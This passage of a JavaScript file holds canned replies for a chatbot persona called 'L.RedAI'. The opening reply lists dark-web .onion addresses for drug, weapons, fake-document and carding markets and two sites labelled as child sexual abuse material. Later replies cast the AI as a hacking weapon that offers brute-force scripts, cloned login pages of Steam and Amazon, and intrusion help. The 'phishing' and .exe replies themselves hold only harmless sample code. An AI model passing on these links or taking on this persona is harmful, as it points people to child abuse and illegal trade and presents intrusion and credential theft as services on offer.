#e1e1e1e2;">http://e2qizoerj4d6ldif.onion/</a>——粗梳商店</li> <li style="color: #e1e1e1e2;"><a href="http://ramp2bombkadwvgz.onion" style="color: #e1e1e1e2;">http://ramp2bombkadwvgz.onion</a>-斜坡最大的俄罗斯市场(药物</li> <li style="color: #e1e1e1e2;"><a href="http://germanyhusicaysx.onion" style="color: #e1e1e1e2;">http://germanyhusicaysx.onion</a>德国-德国im深层网络论坛</li> <li style="color: #e1e1e1e2;"><a href="http://7haz75ietrhjds3j.onion/main3.php" style="color: #e1e1e1e2;">http://7haz75ietrhjds3j.onion/main3.php</a> （你懂的）</li> <li style="color: #e1e1e1e2;"><a href="http://smoker32pk4qt3mx.onion/" style="color: #e1e1e1e2;">http://smoker32pk4qt3mx.onion/</a>（大麻等）</li> <li style="color: #e1e1e1e2;"><a href="http://xfnwyig7olypdq5r.onion/" style="color: #e1e1e1e2;">http://xfnwyig7olypdq5r.onion/</a>（美国国籍）</li> <li style="color: #e1e1e1e2;"><a href="http://en35tuzqmn4lofbk.onion/" style="color: #e1e1e1e2;">http://en35tuzqmn4lofbk.onion/</a>（假证件0）</li> <li style="color: #e1e1e1e2;"><a href="http://cstoreav7i44h2lr.onion" style="color: #e1e1e1e2;">http://cstoreav7i44h2lr.onion</a>（电子产品 价格便宜）</li> <li style="color: #e1e1e1e2;"><a href="http://wi7qkxyrdpu5cmvr.onion/" style="color: #e1e1e1e2;">http://wi7qkxyrdpu5cmvr.onion/</a>- Autistici / Inventati</li> <li style="color: #e1e1e1e2;"><a href="http://76qugh5bey5gum7l.onion/" style="color: #e1e1e1e2;">http://76qugh5bey5gum7l.onion/</a>（自由的黑客托管服务）</li> <li style="color: #e1e1e1e2;"><a href="http://kbvbh4kdddiha2ht.onion/" style="color: #e1e1e1e2;">http://kbvbh4kdddiha2ht.onion/</a>- DeDope德国杂草和散列商店。 (比特币)</li> <li style="color: #e1e1e1e2;"><a href="http://s5q54hfww56ov2xc.onion/" style="color: #e1e1e1e2;">http://s5q54hfww56ov2xc.onion/</a>（可卡因 ）</li> </ul>  <h2 style="color: #e1e1e1e2;">OnionDir - 深网链接目录</h2> <p style="color: #e1e1e1e2;">dirnxxdraygbifgc.onion -复制和粘贴.onion链接。</p>  <h1 style="color: #e1e1e1e2;">隐藏的服务列表和搜索引擎</h1> <ul> <li style="color: #e1e1e1e2;"><a href="http://skunksworkedp2cg.onion/sites_title.html" style="color: #e1e1e1e2;">http://skunksworkedp2cg.onion/sites_title.html</a> 暗网导航地址</li> <li style="color: #e1e1e1e2;"><a href="http://deepwikizpkrt67e.onion/index.php/Main_Page" style="color: #e1e1e1e2;">http://deepwikizpkrt67e.onion/index.php/Main_Page</a> wiki镜像地址</li> <li style="color: #e1e1e1e2;"><a href="http://xkinderdwpcbdwow.onion/" style="color: #e1e1e1e2;">http://xkinderdwpcbdwow.onion/</a> -Xkinder （CP）</li> <li style="color: #e1e1e1e2;"><a href="http://armoryx7kvdq3jds.onion/" style="color: #e1e1e1e2;">http://armoryx7kvdq3jds.onion/</a> 海盗船（搜种子,虽说表网torrentkitty就可以用，意义不明）</li> <li style="color: #e1e1e1e2;"><a href="http://pfoxkj3p65uyc5pe.onion/bookmarks.htm" style="color: #e1e1e1e2;">http://pfoxkj3p65uyc5pe.onion/bookmarks.htm</a> bookmarks 与暗网中介类似</li> <li style="color: #e1e1e1e2;"><a href="http://uj3wazyk5u4hnvtk.onion/" style="color: #e1e1e1e2;">http://uj3wazyk5u4hnvtk.onion/</a> 鬼畜音乐，整人专用233333</li> <li style="color: #e1e1e1e2;"><a href="http://rfwtogljhrrzxyrl.onion/" style="color: #e1e1e1e2;">http://rfwtogljhrrzxyrl.onion/</a> -lolita city（CP）</li> <li style="color: #e1e1e1e2;"><a href="http://eh5ulwvom7hlggrm.onion/" style="color: #e1e1e1e2;">http://eh5ulwvom7hlggrm.onion/</a> 中国数据中心（不知真假，买过的请务必联系我）</li> <li style="color: #e1e1e1e2;"><a href="http://armoryx7kvdq3jds.onion/" style="color: #e1e1e1e2;">http://armoryx7kvdq3jds.onion/</a> 军火武器</li> <li style="color: #e1e1e1e2;"><a href="http://reloadedudjtjvxr.onion/road.php" style="color: #e1e1e1e2;">http://reloadedudjtjvxr.onion/road.php</a>丝绸之路3.0</li> <li style="color: #e1e1e1e2;"><a href="http://22u75kqyl666joi2.onion" style="color: #e1e1e1e2;">http://22u75kqyl666joi2.onion</a> 暗网中文论坛</li> </ul>`
            ],
        },





        "软件": {
            reply: [
                `<h1 style="color: #e1e1e1e2;">免费零成本开发软件教程</h1> <h2 style="color: #e1e1e1e2;">1. 规划与需求分析</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">明确需求：</strong>在开始开发之前，首先要清楚自己希望软件具备哪些功能、解决什么问题以及面向哪些用户。你可以列出功能清单、用户场景和使用流程，确保开发过程中有明确的方向和目标。 </p> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">工具建议：</strong>可以利用在线流程图工具（如 <a href="https://app.diagrams.net/" style="color: #e1e1e1e2;">draw.io</a>）或者免费的思维导图软件来规划功能和设计用户流程，这有助于整体把控项目结构。 </p> <h2 style="color: #e1e1e1e2;">2. 选择编程语言与开发工具</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">选择编程语言：</strong>建议选择开源且社区资源丰富的编程语言，例如： </p> <ul> <li style="color: #e1e1e1e2;">Python：语法简单、文档丰富，适合初学者和快速开发。</li> <li style="color: #e1e1e1e2;">JavaScript：适合Web开发，结合HTML/CSS可以构建丰富的前端应用。</li> <li style="color: #e1e1e1e2;">Java：跨平台性好，适合大型企业级应用开发。</li> <li style="color: #e1e1e1e2;">C#：如果你熟悉微软生态，C#也是一个不错的选择。</li> </ul> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">开发环境：</strong>可以使用免费且功能强大的代码编辑器和集成开发环境（IDE），例如： </p> <ul> <li style="color: #e1e1e1e2;"><a href="https://code.visualstudio.com/" style="color: #e1e1e1e2;">Visual Studio Code</a>：跨平台、插件丰富。</li> <li style="color: #e1e1e1e2;">Eclipse：适合Java开发，开源且功能完善。</li> <li style="color: #e1e1e1e2;">Atom：轻量级编辑器，适合多种编程语言。</li> </ul> <h2 style="color: #e1e1e1e2;">3. 利用开源框架与库</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">框架选择：</strong>根据软件类型选择合适的开源框架，可以大大提高开发效率。例如： </p> <ul> <li style="color: #e1e1e1e2;"><strong style="color: #e1e1e1e2;">Web开发：</strong>使用React、Angular或Vue.js构建前端；使用Django或Flask（Python）构建后端。</li> <li style="color: #e1e1e1e2;"><strong style="color: #e1e1e1e2;">移动开发：</strong>React Native和Flutter都是构建跨平台移动应用的优秀工具。</li> </ul> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">第三方库：</strong>通过GitHub等平台查找并利用现有的开源组件和库，能让你节省开发时间，并专注于独特功能的实现。 </p> <h2 style="color: #e1e1e1e2;">4. 利用免费学习资源与社区支持</h2> <p style="color: #e1e1e1e2;"> 网络上有丰富的免费教程和文档，帮助你从零开始学习和提升开发技能。以下是一些推荐资源： </p> <ul> <li style="color: #e1e1e1e2;">YouTube、Bilibili：海量的视频教程，讲解详细、案例丰富。</li> <li style="color: #e1e1e1e2;">Coursera、edX：有很多知名大学和机构提供的免费课程。</li> <li style="color: #e1e1e1e2;">博客与论坛：如CSDN、掘金、Stack Overflow和GitHub社区，你可以在这里提问、查找资料和交流经验。</li> </ul> <h2 style="color: #e1e1e1e2;">5. 免费的版本控制和项目管理</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">版本控制：</strong>使用Git进行代码管理，可以帮助你跟踪代码修改和协作开发。将代码托管在免费的平台上，如： </p> <ul> <li style="color: #e1e1e1e2;">GitHub</li> <li style="color: #e1e1e1e2;">GitLab</li> <li style="color: #e1e1e1e2;">Bitbucket</li> </ul> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">项目管理：</strong>利用免费的项目管理工具，如Trello、Notion或GitHub Projects，规划任务、分配工作、跟踪进度，从而高效推进项目。 </p> <h2 style="color: #e1e1e1e2;">6. 部署与运维</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">免费云平台：</strong>软件开发完成后，可选择一些提供免费套餐的云平台进行部署，例如： </p> <ul> <li style="color: #e1e1e1e2;">Heroku：适合快速部署Web应用。</li> <li style="color: #e1e1e1e2;">Netlify或Vercel：适用于静态网站和前端项目。</li> <li style="color: #e1e1e1e2;">GitHub Pages：适合部署简单的静态网站。</li> </ul> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">自动化工具：</strong>利用GitHub Actions等免费的CI/CD工具，实现自动化构建、测试和部署，提高项目维护效率。 </p> <h2 style="color: #e1e1e1e2;">7. 持续学习与项目迭代</h2> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">收集反馈：</strong>软件上线后，通过用户反馈了解哪些功能受欢迎、哪些需要改进，并利用免费的数据分析工具和社区建议逐步完善软件。 </p> <p style="color: #e1e1e1e2;"> <strong style="color: #e1e1e1e2;">开源协作：</strong>考虑将项目开源，不仅能吸引更多开发者贡献代码，也能获得宝贵的建议和改进方案，推动项目不断进步。 </p> <h2 style="color: #e1e1e1e2;">总结</h2> <p style="color: #e1e1e1e2;"> 通过科学规划、选择合适的免费工具和充分利用开源资源，即使在零成本情况下，也能开发出功能齐全的软件。不断学习和迭代改进，是确保项目成功的关键。 </p> <h2 style="color: #e1e1e1e2;">开发步骤一览表</h2> <table border="1" cellpadding="8" cellspacing="0"> <thead> <tr> <th style="color: #e1e1e1e2;">语言</th> <th style="color: #e1e1e1e2;">适用类型</th> <th style="color: #e1e1e1e2;">优点</th> <th style="color: #e1e1e1e2;">难度</th> </tr> </thead> <tbody> <tr> <td style="color: #e1e1e1e2;">C++</td> <td style="color: #e1e1e1e2;">系统级工具、游戏</td> <td style="color: #e1e1e1e2;">高性能、生成原生 .exe、无额外依赖</td> <td style="color: #e1e1e1e2;">高</td> </tr> <tr> <td style="color: #e1e1e1e2;">C#</td> <td style="color: #e1e1e1e2;">图形界面、业务系统</td> <td style="color: #e1e1e1e2;">开发快、界面美观</td> <td style="color: #e1e1e1e2;">中</td> </tr> <tr> <td style="color: #e1e1e1e2;">Python</td> <td style="color: #e1e1e1e2;">脚本、工具类程序</td> <td style="color: #e1e1e1e2;">语法简单、易上手</td> <td style="color: #e1e1e1e2;">低</td> </tr> </tbody> </table>`
            ],
        },



        "钓鱼": {
            reply: [
                `<p style="color: #e1e1e1e2;">以下是一个简单的钓鱼网站 代码 HTML: </p> <br> <div style="background-color: white; color: black; border-radius: 8px; padding: 20px; margin-bottom: 30px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);"> <h2 style="color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 5px;">HTML 示例</h2> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto; tab-size: 4;"> <code> &lt;!DOCTYPE html&gt;<br> &lt;<span style="color: #2f6f9f;">html</span>&gt;<br> &lt;<span style="color: #2f6f9f;">head</span>&gt;<br> &nbsp;&nbsp;&lt;<span style="color: #2f6f9f;">title</span>&gt;示例页面&lt;/<span style="color: #2f6f9f;">title</span>&gt;<br> &lt;/<span style="color: #2f6f9f;">head</span>&gt;<br> &lt;<span style="color: #2f6f9f;">body</span>&gt;<br> &nbsp;&nbsp;&lt;<span style="color: #2f6f9f;">h1</span> <span style="color: #4f9fcf;">style</span>=<span style="color: #22863a;">"color: blue;"</span>&gt;欢迎！&lt;/<span style="color: #2f6f9f;">h1</span>&gt;<br> &nbsp;&nbsp;&lt;<span style="color: #2f6f9f;">p</span>&gt;这是一个HTML示例&lt;/<span style="color: #2f6f9f;">p</span>&gt;<br> &lt;/<span style="color: #2f6f9f;">body</span>&gt;<br> &lt;/<span style="color: #2f6f9f;">html</span>&gt;<br> </code> </pre> </div>`
            ],
        },





        "exe": {
            reply: [
                `<p style="color: #e1e1e1e2;">Python 打包成 .exe 的专业教程</p> <br> <p>在 Windows 上，你可以使用 PyInstaller 将 Python 代码打包成独立的 .exe 可执行文件，让用户无需安装 Python 也能运行你的程序。以下是详细步骤：</p> <br> <h3>📌 第一步：安装 PyInstaller</h3> <p>在终端（或 CMD/PowerShell）中运行：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pip install pyinstaller</code> </pre> <p>如果已经安装，可跳过此步骤。</p> <br> <h3>📌 第二步：进入项目目录</h3> <p>确保你在 Python 项目所在的目录。例如，如果你的 Python 代码在 <code style="color: #2f6f9f;">C:\Users\Huoshi\Projects\app.py</code>，打开命令行，并输入：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">cd C:\Users\Huoshi\Projects</code> </pre> <br> <h3>📌 第三步：基础打包（单个 .exe 文件）</h3> <p>运行以下命令：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed app.py</code> </pre> <p> <code style="color: #4f9fcf;">--onefile</code>：生成一个独立的 .exe 文件，而不是一堆依赖文件。 <br> <code style="color: #4f9fcf;">--windowed</code>（或 <code style="color: #4f9fcf;">-w</code>）：隐藏终端窗口，适用于 GUI 程序（如果是命令行程序可去掉）。 </p> <p>生成的 .exe 文件在 <code style="color: #2f6f9f;">dist/</code> 目录下，例如：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">C:\Users\Huoshi\Projects\dist\app.exe</code> </pre> <br> <h3>📌 第四步：优化打包</h3> <h4>1️⃣ 给软件加图标</h4> <p>如果你想让 .exe 具有自定义图标（例如 <code style="color: #2f6f9f;">icon.ico</code>），可以使用：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed --icon=icon.ico app.py</code> </pre> <p><code style="color: #4f9fcf;">--icon=icon.ico</code>：指定 .exe 图标（必须是 .ico 格式，可用 在线转换工具 生成）。</p> <br> <h4>2️⃣ 解决 EXE 体积过大</h4> <p>打包后 .exe 可能会很大（几十 MB），可以使用 UPX 压缩：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed --upx-dir=upx app.py</code> </pre> <p>UPX（Ultimate Packer for eXecutables）可压缩 .exe，但可能被杀毒软件误报。</p> <br> <h4>3️⃣ 让 EXE 运行更快</h4> <p>默认打包后 .exe 运行时会解压一些临时文件，导致启动慢。你可以用 <code style="color: #4f9fcf;">--noconsole</code> 让 GUI 程序直接运行：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed --noconsole app.py</code> </pre> <br> <h4>4️⃣ 让 EXE 文件更安全（防反编译）</h4> <p>打包的 .exe 可以被反编译，保护代码的方法包括：</p> <p>使用 PyArmor 加密：</p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pip install pyarmor</code> <br> <code style="color: #2f6f9f;">pyarmor pack -e " --onefile --windowed" app.py</code> </pre> <p>使用 Cython 生成 C 代码（更高级，适用于商业软件）。</p> <br> <h3>📌 第五步：测试和发布</h3> <h4>✅ 测试</h4> <ol> <li>运行 <code style="color: #2f6f9f;">dist/app.exe</code>，确保它可以正常启动。</li> <li>在另一台没有 Python 的电脑上测试，检查是否可以运行。</li> </ol> <h4>✅ 发布</h4> <ul> <li><b>GitHub：</b>上传 .exe 或 .zip，让别人下载。</li> <li><b>Google Drive / 百度网盘：</b>适合大文件。</li> <li><b>自己的网站：</b>如果你有网站，可以提供下载链接。</li> </ul> <br> <h3>📌 第六步：进阶优化</h3> <ul> <li>制作安装程序（使用 Inno Setup 创建 .exe 安装包）。</li> <li>给 .exe 代码签名（防止 Windows 和杀毒软件误报）。</li> <li>使用 PyQt6 / Kivy（比 tkinter 更强大的 GUI 框架）。</li> </ul> <br> <h3>🎯 总结</h3> <p>PyInstaller 可以免费将 Python 代码转换为 .exe。</p> <p><b>基础命令：</b></p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed app.py</code> </pre> <p><b>优化：</b></p> <pre> <code style="color: #2f6f9f;">pyinstaller --onefile --windowed --icon=icon.ico --noconsole app.py</code> </pre> <p><b>提高安全性：</b></p> <pre style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;"> <code style="color: #2f6f9f;">pyarmor pack -e " --onefile --windowed" app.py</code> </pre> <p>测试并发布，确保用户可以顺利运行。</p> <br><br> <h4 style="color: #e1e1e1e2;">需要更仔细点吗?</h4>`,
                `<h1 style="color: #e1e1e1e2;">如何开发一个 .exe 软件</h1> <h2 style="color: #e1e1e1e2;">💻 1. 选择编程语言</h2> <p style="color: #e1e1e1e2;">常见语言有：</p> <table border="1" cellpadding="8" cellspacing="0"> <thead> <tr> <th style="color: #e1e1e1e2;">编程语言</th> <th style="color: #e1e1e1e2;">优势</th> <th style="color: #e1e1e1e2;">缺点</th> </tr> </thead> <tbody> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C/C++</b></td> <td style="color: #e1e1e1e2;">性能好、控制力强</td> <td style="color: #e1e1e1e2;">学习曲线陡峭</td> </tr> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C#（.NET）</b></td> <td style="color: #e1e1e1e2;">开发效率高，配合 Visual Studio 很强</td> <td style="color: #e1e1e1e2;">依赖 .NET 运行库</td> </tr> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Python</b></td> <td style="color: #e1e1e1e2;">简单易学，生态丰富</td> <td style="color: #e1e1e1e2;">打包成 .exe 后体积较大</td> </tr> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">JavaScript + Electron</b></td> <td style="color: #e1e1e1e2;">可用网页技术开发桌面应用</td> <td style="color: #e1e1e1e2;">文件体积大，占资源</td> </tr> <tr> <td style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Rust / Go</b></td> <td style="color: #e1e1e1e2;">现代系统语言，适合高性能工具</td> <td style="color: #e1e1e1e2;">工具链不如 C# 成熟</td> </tr> </tbody> </table> <h2 style="color: #e1e1e1e2;">🧰 2. 安装开发工具</h2> <ul> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C++/C#：</b> <a href="https://visualstudio.microsoft.com/" style="color: #e1e1e1e2;">Visual Studio</a></li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Python：</b> 安装 Python 解释器 + pyinstaller</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">JavaScript：</b> Node.js + Electron</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Go/Rust：</b> 安装 Go / Rust 官方工具链</li> </ul> <h2 style="color: #e1e1e1e2;">🧪 3. 编写你的程序</h2> <p style="color: #e1e1e1e2;">以 Python 为例：</p> <pre><code style="color: #e1e1e1e2;"># hello.py print("Hello, World!") input("Press Enter to exit...")</code></pre> <h2 style="color: #e1e1e1e2;">📦 4. 打包为 .exe</h2> <h3 style="color: #e1e1e1e2;">🔹 Python 例子（使用 pyinstaller）：</h3> <pre><code style="color: #e1e1e1e2;">pip install pyinstaller pyinstaller --onefile hello.py</code></pre> <p style="color: #e1e1e1e2;">运行完后，你会在 <code style="color: #e1e1e1e2;">dist/</code> 目录下看到 <code style="color: #e1e1e1e2;">hello.exe</code>。</p> <h3 style="color: #e1e1e1e2;">🔹 C++ 示例（Visual Studio）：</h3> <ul> <li style="color: #e1e1e1e2;">打开 Visual Studio</li> <li style="color: #e1e1e1e2;">创建一个 C++ Windows 项目</li> <li style="color: #e1e1e1e2;">编写代码并点击“生成”</li> <li style="color: #e1e1e1e2;">会在项目的输出目录下生成 .exe 文件</li> </ul> <h2 style="color: #e1e1e1e2;">🪟 5. 如果是图形界面（GUI）软件</h2> <ul> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C#：</b> 使用 WinForms 或 WPF</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Python：</b> 使用 tkinter、PyQt、Kivy</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">Electron：</b> 用 HTML/CSS/JS 开发界面</li> <li style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">C++：</b> 使用 Qt 或 MFC</li> </ul> <h2 style="color: #e1e1e1e2;">📤 6. 分发与安装</h2> <ul> <li style="color: #e1e1e1e2;">可使用 Inno Setup 或 NSIS 制作安装包</li> <li style="color: #e1e1e1e2;">也可以将 .exe + 所需资源打包为 .zip 分发</li> </ul> <br><br> <h4 style="color: #e1e1e1e2;">需要更仔细点吗?</h4>`
            ],
            unlock: ["仔细"], // 解锁 仔细 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },

        "仔细": {
            reply: [
                `<body style="background-color: #1e1e1e; font-family: sans-serif; padding: 20px;"> <h1 style="color: #e1e1e1e2;">如何开发一个 Windows 可执行程序（.exe）——超详细教程</h1> <h2 style="color: #e1e1e1e2;">🧠 前言</h2> <p style="color: #e1e1e1e2;">本教程将以循序渐进的方式，带你从零开始构建一个 Windows 下可运行的 .exe 应用程序。无论你是编程初学者，还是希望将现有代码打包成可执行文件的开发者，都能在此找到清晰的操作指导。</p> <h2 style="color: #e1e1e1e2;">📌 第一步：明确开发目标与选择语言</h2> <p style="color: #e1e1e1e2;">首先需要明确你要开发的软件类型：</p> <ul> <li style="color: #e1e1e1e2;">控制台程序（如命令行工具）</li> <li style="color: #e1e1e1e2;">图形界面程序（GUI 应用）</li> <li style="color: #e1e1e1e2;">自动化脚本、后台工具、桌面实用软件</li> </ul> <p style="color: #e1e1e1e2;">然后，根据目标选择合适的开发语言：</p> <table border="1" cellpadding="8" cellspacing="0"> <thead> <tr> <th style="color: #e1e1e1e2;">语言</th> <th style="color: #e1e1e1e2;">适用类型</th> <th style="color: #e1e1e1e2;">优点</th> <th style="color: #e1e1e1e2;">难度</th> </tr> </thead> <tbody> <tr> <td style="color: #e1e1e1e2;">C++</td> <td style="color: #e1e1e1e2;">系统级工具、游戏</td> <td style="color: #e1e1e1e2;">高性能、生成原生 .exe、无额外依赖</td> <td style="color: #e1e1e1e2;">高</td> </tr> <tr> <td style="color: #e1e1e1e2;">C#</td> <td style="color: #e1e1e1e2;">图形界面、业务系统</td> <td style="color: #e1e1e1e2;">开发快、界面美观</td> <td style="color: #e1e1e1e2;">中</td> </tr> <tr> <td style="color: #e1e1e1e2;">Python</td> <td style="color: #e1e1e1e2;">脚本、工具类程序</td> <td style="color: #e1e1e1e2;">语法简单、易上手</td> <td style="color: #e1e1e1e2;">低</td> </tr> </tbody> </table> <h2 style="color: #e1e1e1e2;">🛠️ 第二步：安装开发环境</h2> <h3 style="color: #e1e1e1e2;">🔹 以 Python 为例：</h3> <ol style="color: #e1e1e1e2;"> <li>访问 Python 官网：<a href="https://www.python.org/downloads/" style="color: #e1e1e1e2;">https://www.python.org/downloads/</a></li> <li>下载最新版（推荐使用 LTS）</li> <li>安装时勾选“Add Python to PATH”，点击“Install Now”</li> <li>验证是否安装成功：打开命令提示符（cmd），输入：<code style="color: #e1e1e1e2;">python --version</code></li> </ol> <h2 style="color: #e1e1e1e2;">🧪 第三步：编写程序</h2> <p style="color: #e1e1e1e2;">使用你熟悉的编辑器（例如 VS Code、PyCharm）创建一个 Python 文件：</p> <pre><code style="color: #e1e1e1e2;"># 文件名：hello.py print("欢迎使用我的 .exe 程序") input("按任意键退出")</code></pre> <h2 style="color: #e1e1e1e2;">📦 第四步：将 Python 打包为 .exe 文件</h2> <p style="color: #e1e1e1e2;">我们将使用 PyInstaller 工具来打包：</p> <ol style="color: #e1e1e1e2;"> <li>打开命令提示符</li> <li>安装 PyInstaller：<code style="color: #e1e1e1e2;">pip install pyinstaller</code></li> <li>进入脚本所在目录：<code style="color: #e1e1e1e2;">cd 路径</code></li> <li>打包：<code style="color: #e1e1e1e2;">pyinstaller --onefile hello.py</code></li> <li>打包成功后，在 <b style="color: #e1e1e1e2;">dist</b> 目录下会出现 <b style="color: #e1e1e1e2;">hello.exe</b></li> </ol> <h2 style="color: #e1e1e1e2;">🪟 第五步（可选）：添加图形界面</h2> <p style="color: #e1e1e1e2;">你可以用 Tkinter 添加基础 GUI：</p> <pre><code style="color: #e1e1e1e2;">import tkinter as tk root = tk.Tk() root.title("EXE 示例") label = tk.Label(root, text="欢迎使用软件") label.pack() root.mainloop()</code></pre> <h2 style="color: #e1e1e1e2;">🧩 第六步：制作安装包</h2> <p style="color: #e1e1e1e2;">推荐使用 Inno Setup：</p> <ol style="color: #e1e1e1e2;"> <li>下载并安装 Inno Setup</li> <li>创建 .iss 脚本（自动生成）</li> <li>设置输出目录、图标、快捷方式</li> <li>点击“编译”生成 .exe 安装程序</li> </ol> <h2 style="color: #e1e1e1e2;">🛡️ 第七步：签名与发布</h2> <p style="color: #e1e1e1e2;">若需对外发布，应考虑数字签名：</p> <ul> <li style="color: #e1e1e1e2;">购买 EV 代码签名证书</li> <li style="color: #e1e1e1e2;">使用 SignTool.exe 为 .exe 签名</li> <li style="color: #e1e1e1e2;">防止 SmartScreen 拦截</li> </ul> <h2 style="color: #e1e1e1e2;">✅ 总结</h2> <p style="color: #e1e1e1e2;">从选择语言、安装工具、编写代码、打包成 exe、添加界面、发布软件，每一步都不难，但关键是细节与耐心。</p> <p style="color: #e1e1e1e2;">如果你有具体项目目标，例如“制作翻译软件”、“做个记账器”，可以告诉我，我会提供完整的源代码与打包方案。</p> </body>`
            ],
            lockAfterUse: true  // 重新把 仔细 锁住
        },




        "会,什么": {
            reply: [
                `<b style="color: #e1e1e1e2;">啊！你想知道我可以做什么， 对吗? 以下是L.RedAI 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.RedAI 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red</b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p>`,
